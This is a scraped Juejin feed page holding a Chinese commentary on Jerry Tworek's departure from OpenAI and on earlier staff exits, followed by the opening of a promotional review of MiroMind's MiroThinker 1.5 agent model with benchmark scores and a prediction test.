.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74ab81317c974f56a8f4b25ce407d880~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=3u5Ax%2B8jsI0iNJZS%2BX1iWF84JPw%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】新年第一弹，OpenAI 研发副总裁 Jerry Tworek 官宣离职，这位七年老兵给出的理由让人细思恐极：想做在 OpenAI 做不了的研究。从 Dario Amodei 出走创立 Anthropic，到 Ilya 政变后离开，再到安全团队负责人摔门而出——OpenAI 的核心大脑们正在以惊人的速度流失。」</strong></h5>
<p>OpenAI 又双叒叕走人了。</p>
<p>新年刚开工，一个重磅消息就给 AI 圈投下了一枚炸弹——</p>
<p>OpenAI 研发副总裁 Jerry Tworek 正式宣布离职，结束了他在这家公司长达七年的征程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0038770cf66f44b091fb2058dfa0880e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=10B%2FAKQQc%2F69yHGslBI9plyrMa0%3D" alt="" loading="lazy"/></p>
<p>Jerry Tworek 绝对属于 OpenAI 的殿堂级技术灵魂人物。</p>
<p>他的分量不仅仅在于职位（研发副总裁），更在于他是 OpenAI 编程和两大核心技术路线的奠基人和掌舵者。</p>
<p>简单来说，是他让 ChatGPT 学会了写代码，也是他让 AI 学会了像人类一样慢思考。</p>
<p>Jerry Tworek 的研究直接攻克了 LLM（大语言模型）最难的两个商业化落地场景——<strong>「编程」<strong>和</strong>「复杂推理」</strong>。</p>
<ul>
<li><strong>「「推理模型」之父 (o1/o3 系列)」</strong>：根据其个人主页记录，他是 <em>OpenAI o1</em> 项目的团队负责人。</li>
<li><strong>「「编程代码」之父 (Codex)」</strong>：他是 <strong>「Codex」</strong> 模型的核心研究员。</li>
<li><strong>「GPT-4 的核心贡献者」</strong>：专门负责让 GPT-4 具备解决复杂编程挑战的能力。</li>
<li><strong>「GPT-5 与 Agent（智能体）」</strong>：他在 2025 年主导了 <strong>「GPT-5」</strong> 的部署以及 <strong>「ChatGPT Agent」</strong> 的研发。</li>
<li><strong>「解决数学难题」</strong>：他参与发表的论文是让 AI 能够做对数学题的关键研究。</li>
<li><strong>「高引用影响力」</strong>：他在 GoogleScholar 上的论文引用数极高，特别是在「代码生成」和「强化学习（RLHF）」领域。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ed66d1647374e63b17b2629ed883281~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=OZlkmCMCuwEmAGGvGX%2BpeSYY9gQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3295274964fb4632bc1051ad3fcaf413~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=YDmPDT9PnRufMLkVNNeGxkN8vMM%3D" alt="" loading="lazy"/></p>
<p>&lt;&lt;滑动查看下一张图片&gt;&gt;</p>
<p>Jerry Tworek 离职声明 &amp; 各位大佬送上祝福</p>
<p>七年是什么概念？</p>
<p>OpenAI 到今天也才成立不到十年。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a377e23d4d7f4336925b6580fd723e4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=ssvcIlg2%2BzvFchBX4UmJPLxIz6Y%3D" alt="" loading="lazy"/></p>
<p>可以说，Tworek 是看着这家公司从一个理想主义的非营利研究机构，一步步走到今天这个估值千亿的商业巨兽的亲历者。</p>
<p>然而，就是这样一位「开国功臣」级别的人物，选择在 2026 年的第一个周末，用一封内部备忘录，为自己的 OpenAI 生涯画上了句号。</p>
<p><strong>「离开的理由，细品之下耐人寻味——」</strong></p>
<p>「我想探索那些在 OpenAI 内部难以开展的研究类型。」</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e39245ed131348b88f2f0eba4ee29874~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=DvBlZQzOi%2FiA7dEOqIRDBxklyWU%3D" alt="" loading="lazy"/></p>
<p>这话说得相当委婉，但懂的都懂。</p>
<p>翻译一下就是：这里的研究方向，已经不是我想走的路了。</p>
<p><strong>「走的何止是一个人，离的是一颗心」</strong></p>
<p>如果只是 Tworek 一个人离开，或许还可以用个人发展来解释。</p>
<p>但问题是，这已经不是 OpenAI 第一次流失核心人才了——</p>
<p><strong>「先盘一盘这几年走的大佬们：」</strong></p>
<p><strong>「Dario Amodei」</strong>，OpenAI 前研究副总裁，2021 年出走创立 Anthropic，现在是 Claude 的掌门人。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ce06e38cc964b11a43ae41124044276~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=cmK0JVIcve0nqAo2MrAnBrEK408%3D" alt="" loading="lazy"/></p>
<p>没错，就是那个让 OpenAI 睡不着觉的 Claude！</p>
<p><strong>「Ilya Sutskever」</strong>，OpenAI 联合创始人兼首席科学家，那个曾经发动政变差点把奥特曼干下去的男人，后来也离开创业去了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2abca30d8df74a958d0dc548747ef284~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=oqb%2BqVBU9HC43inwvnPod71AxbE%3D" alt="" loading="lazy"/></p>
<p><strong>「John Schulman」</strong>，强化学习大牛，ChatGPT 背后的核心技术推手之一，去年也跑了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10d25e5fff8a4b3f90b78f8b7d68680a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=VNLUDQeXcD%2Bjva8Ke4azROEOpkQ%3D" alt="" loading="lazy"/></p>
<p><strong>「Jan Leike」</strong>，超级对齐团队负责人，因为安全理念不合直接撂挑子。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c941abf444b42ada2c911f0dfb6af7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=DP%2F61SaKVBLisH9TMxhbTK3N6oE%3D" alt="" loading="lazy"/></p>
<p>还有产品、政策、安全等各条线的 VP 级别人物，走马灯似的换。。。</p>
<p>现在又加上七年老兵 Tworek。</p>
<p><strong>「你品，你细品。」</strong></p>
<p>如果说一个人离开是偶然，两个人是巧合，那这么多核心骨干前赴后继地出走，是不是说明了些什么？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a020aba64cb4322bc218ce49515ebf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=r8uMezTrDbP1g7eCS2d2o4e2tOE%3D" alt="" loading="lazy"/></p>
<p><strong>「为什么大佬们都在逃离 AI 第一大厂？」</strong></p>
<p>有人可能会问：OpenAI 现在不是如日中天吗？</p>
<p>GPT-5 各种秀肌肉，Sora 惊艳全球，估值都快追上特斯拉了，怎么人还往外跑？</p>
<p><strong>「答案可能藏在三个字里：商业化。」</strong></p>
<p>OpenAI 最初是以确保 AGI 造福全人类为使命成立的非营利组织。</p>
<p>但随着 ChatGPT 的爆火，微软百亿美金的注入，这家公司已经彻底变了味：</p>
<p>从理想主义的研究圣地，变成了一台需要不断推出产品、追求商业回报的赚钱机器。</p>
<p>当年那群相信慢工出细活、追求技术突破的研究员们，突然发现自己的工作变成了：</p>
<ul>
<li>赶发布 deadline</li>
<li>卷产品化功能</li>
<li>讨好投资人和用户</li>
</ul>
<p><strong>「这和他们最初加入的那个研究乌托邦，完全不是一回事。」</strong></p>
<p>更关键的是，安全问题。</p>
<p>Jan Leike 离开时几乎是摔门而出，公开表示 OpenAI 把安全放在了次要位置。</p>
<p>当你负责保证 AI 不会伤害人类，但公司却觉得你在拖后腿，这种撕裂感可想而知。</p>
<p>Tworek 说想做在 OpenAI 做不了的研究，某种程度上，也是在说同样的话。</p>
<p><strong>「奥特曼：越走越多的人，越来越空的王座」</strong></p>
<p>说完离开的人，我们来聊聊留下的那个：Sam Altman。</p>
<p>2023 年年底那场宫斗大戏，相信大家都还记得。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d3eee8882414222b050014253a0e6cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=vtc1YrDosP68g71qEZXRyAdY9HA%3D" alt="" loading="lazy"/></p>
<p>Ilya 联合董事会把奥特曼撸下去，结果不到一周又被迎回来，上演了一出硅谷版的二进宫。</p>
<p>当时奥特曼赢了，笑到了最后。</p>
<p><strong>「但现在回头看，他真的赢了吗？」</strong></p>
<p>发动政变的 Ilya 走了。</p>
<p>反对他的董事们被清洗了。</p>
<p>质疑安全问题的 Jan Leike 走了。</p>
<p>老资格的研究骨干们一个接一个走了。</p>
<p>是的，奥特曼牢牢掌控着 OpenAI 的权力。</p>
<p><strong>「但这个权力，正在变得越来越孤独。」</strong></p>
<p>当年一起打天下的元老们，要么因为理念不合离开，要么在权力斗争中被边缘化。</p>
<p>留下来的，有多少是真心追随，又有多少只是在等待股票解锁？</p>
<p>与此同时，OpenAI 的竞争对手们却在疯狂壮大：</p>
<p>Anthropic 招揽着 OpenAI 的得力干将，Claude 在编程方面把 GPT 逼得喘不过气；</p>
<p>谷歌的 Gemini 不断迭代，在多模态领域虎视眈眈；</p>
<p>Meta、xAI、以及一大群开源势力在后面穷追猛打。</p>
<p><strong>「奥特曼手里的牌，真的还像以前那么好吗？」</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99302dd78e8846918be68a0cfbdb03d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=knsWFQxhDF0oJvH4UG57fnq4nq8%3D" alt="" loading="lazy"/></p>
<p><strong>「</strong>「2026 年，OpenAI 还行不行？」<strong>」</strong></p>
<p>这个问题，可能连奥特曼自己也说不准。</p>
<p><strong>「但有意思的是，就在老兵们纷纷离去的同时，OpenAI 也在迎来一批新鲜血液。」</strong></p>
<p>Lexica 创始人 <strong>「Sharif Shameem」</strong> 刚刚宣布加入 OpenAI！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5bb730a40524ef2ba6e50a72cb4995d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=IpQ%2BWnOtz5EpbzvlSDJUHx%2Fngkg%3D" alt="" loading="lazy"/></p>
<p>这位 AI 图像搜索引擎的开创者认为，现在是一个堪比 70 年代施乐 PARC 定义桌面计算的历史性转折点。</p>
<p>他的愿景是实现真正的人机共生——用智能模型增强人类的智力和创造力，而不是简单替代。</p>
<p><strong>「一边是老将出走，一边是新人涌入。」</strong></p>
<p><strong>「一边是这里做不了想做的研究，一边是这里是改变世界的最佳舞台。」</strong></p>
<p>这种冰火两重天的景象，或许正是 OpenAI 当下处境的最真实写照。</p>
<p><strong>「看多的人会说：」</strong></p>
<ul>
<li>GPT 系列依然领先</li>
<li>微软是坚定的盟友</li>
<li>用户规模和商业收入都在增长</li>
<li>技术积累和人才储备依然雄厚</li>
</ul>
<p><strong>「看空的人会说：」</strong></p>
<ul>
<li>核心人才持续流失</li>
<li>安全问题悬而未决</li>
<li>商业化透支技术信用</li>
<li>竞争对手日益逼近</li>
</ul>
<p><strong>「而我想说的是：」</strong></p>
<p>一家科技公司最核心的资产是什么？</p>
<p>不是代码，不是数据，不是 GPU 集群。</p>
<p><strong>「是人。」</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aebd4b216e449d5a12d3e43011957f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301522&amp;x-signature=qB1uC%2B9yJZ%2BesThUCqi6kTHdoBE%3D" alt="" loading="lazy"/></p>
<p>当那些最聪明的大脑开始用脚投票，当创始团队的元老们一个个转身离去，当做不了想做的研究成为离职的理由——</p>
<p>这本身就是一个危险的信号。</p>
<p>Tworek 的离开，可能只是 2026 年的第一滴雨。</p>
<p>至于后面会不会变成暴风雨，就让时间来回答吧。</p>
<p>唯一可以确定的是：<strong>「那个理想主义的 OpenAI，已经一去不复返了。」</strong></p>
<p>留下的，是一个在商业利益和技术理想之间不断撕扯的庞然大物，以及一个不断需要证明自己的 Sam Altman。</p>
<p><strong>「当初一起仰望星空的人，如今纷纷转身离去。」</strong></p>
<p><strong>「奥特曼，你还好吗？」</strong></p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theverge.com%2Fai-artificial-intelligence%2F855590%2Fopenais-research-lead-is-departing-after-nearly-seven-years" target="_blank" title="https://www.theverge.com/ai-artificial-intelligence/855590/openais-research-lead-is-departing-after-nearly-seven-years" ref="nofollow noopener noreferrer">www.theverge.com/ai-artifici…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[陈天桥代季峰打响2026大模型第一枪：30B参数跑出1T性能]]></title>    <link>https://juejin.cn/post/7592089325912195072</link>    <guid>https://juejin.cn/post/7592089325912195072</guid>    <pubDate>2026-01-06T10:52:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592089325912195072" data-draft-id="7591942733366444066" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="陈天桥代季峰打响2026大模型第一枪：30B参数跑出1T性能"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-01-06T10:52:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="量子位"/> <meta itemprop="url" content="https://juejin.cn/user/2858385963484488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            陈天桥代季峰打响2026大模型第一枪：30B参数跑出1T性能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2858385963484488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    量子位
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T10:52:05.000Z" title="Tue Jan 06 2026 10:52:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>新年刚至，陈天桥携手代季峰率先打响开源大模型的第一枪。</p>
<p>正式发布其自研的旗舰版搜索智能体模型——<strong>MiroThinker 1.5</strong>，堪称智能体模型领域的最强小钢炮。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/407fda813cb64d6f9718c58c9debb7b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=UhKNqE7Lgu4HdvMS7ytFvXUfX%2Bc%3D" alt="" loading="lazy"/></p>
<p>最直观的还是基准测试上的性能评测：</p>
<p>在面对 GPT-5-High、Gemini-3-Pro、DeepSeek-V3.2 等一系列国内外顶尖模型，MiroThinker 1.5 在四项基准测试中的表现都毫不逊色：</p>
<ul>
<li>
<p>HLE-Text_（人类终极测试）_：39.2%</p>
</li>
<li>
<p>BrowseComp_（网页检索类大模型基准测试）_：69.8%</p>
</li>
<li>
<p>BrowseComp-ZH_（BrowseComp 的中文适配版本）_：71.5%</p>
</li>
<li>
<p>GAIA-Val-165_（GAIA 基准测试验证集）_：80.8%</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/191d9e7b3ddc4381a3558d8c798c397d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=sVX7eSCw3OeJlTcAzEAgSF6neO0%3D" alt="" loading="lazy"/></p>
<p>尤其是在 BrowseComp 上，直接刷新了 ChatGPT-Agent 保持的榜单纪录，强势跻身全球第一梯队。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a68ed023c182405aa692dd007394c2bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=n1EFmu8C4rM3tsSk7FQut8xsjeI%3D" alt="" loading="lazy"/></p>
<p>但要知道 MiroThinker 1.5 的参数规模只有它们的 <strong>1/30</strong>，仅 30B 和 235B 大小。</p>
<p>换句话说，在全行业大模型都在卷参数规模和上下文长度时，MiroThinker 1.5 直接用高智效比跑出了相近甚至更好的效果，原因就在于它抓住了这股 “巧劲”：</p>
<p>给答案不靠死记硬背，而是通过大量深入的外部世界交互来逐步提升推理能力。</p>
<p>比如将 MiroThinker-v1.5-30B 和 1T 参数的 Kimi-K2-Thinking 对比，不仅在 BrowseComp-ZH 测试中实现了 4.5% 的性能超越，在推理成本上，MiroThinker 1.5 的单条调用成本更是低至 $0.07，只有 Kimi 的 1/20。</p>
<p>不止如此，MiroThinker 1.5 的推理速度也显著优于 Kimi-K2-Thinking，足以见得 <strong>“大” 不等于 “强”</strong>，叠参数也并非大模型的唯一通解。</p>
<p>值得关注的是，它对开发者也相当友好，上线即开源。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd99ec8c611a430ba3a314e2a82e6d56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=g9Z%2FYBj3SSQP73sKhsmdDVxAMTg%3D" alt="" loading="lazy"/></p>
<p>而负责操刀这款模型的正是 <strong>MiroMind</strong> 团队，此前曾凭借成功预测 Polymarket_（全球最大的去中心化预测市场）_筛选题目，连续登顶 Future X 全球榜首，力压诸多国际顶尖机构和闭源商业模型。</p>
<p>MiroThinker 1.5 的推出，则是在团队已有的技术积累上更进一步，整体预测能力达到 next level。</p>
<p>那么具体效果如何？眼见为实，下面实测见真章。</p>
<h2 data-id="heading-0">小参数也能跑进第一梯队</h2>
<p>实测之前，先简要介绍一下交互界面。（体验入口：_<a href="https://link.juejin.cn?target=https%3A%2F%2Fdr.miromind.ai%2F_%25EF%25BC%2589" target="_blank" title="https://dr.miromind.ai/_%EF%BC%89" ref="nofollow noopener noreferrer">dr.miromind.ai/_）</a></p>
<p>和常规的大模型对话窗口一致，点击左下角按钮即可升级为<strong>专业模式</strong>：内置更大尺寸的模型，同时支持文件上传。</p>
<p>P.S. 界面下方还有一些系统自动推荐的预测问题可供参考。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f599a33b577f42959c68275231ebdca0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=2dyjLUYW6d5sisPA0WYNBYnI8VM%3D" alt="" loading="lazy"/></p>
<p>下面我们先以一个基础的体育赛事预测为例，测试模型对实时信息的捕获和分析能力：</p>
<blockquote>
<p>在 2026 年即将举办的世界杯中，考虑到分组名单和球队阵容，请给出胜率预测及可能的原因。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/296e5df3429045ff8d3fde2c17b6c45f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=IlMK2rUtCo0AngPS4T%2BMUjVn6Z4%3D" alt="" loading="lazy"/></p>
<p>首先给我的第一感受是：<strong>快 + 完整</strong>。</p>
<p>从输入问题到输出，总耗时两分钟，而且思维过程全部清晰可见。</p>
<p>比如它会先梳理自己所需的全部信息，给出一条合理的预测路径：分组情况→阵容信息→胜率预测。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0876cabd94cf4997b8a9d78279785540~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=g74EIzoPI5Dy6Bc1ugvPQe2O1o8%3D" alt="" loading="lazy"/></p>
<p>接着在每一项具体步骤中，反思验证当前内容，并给出修正意见。</p>
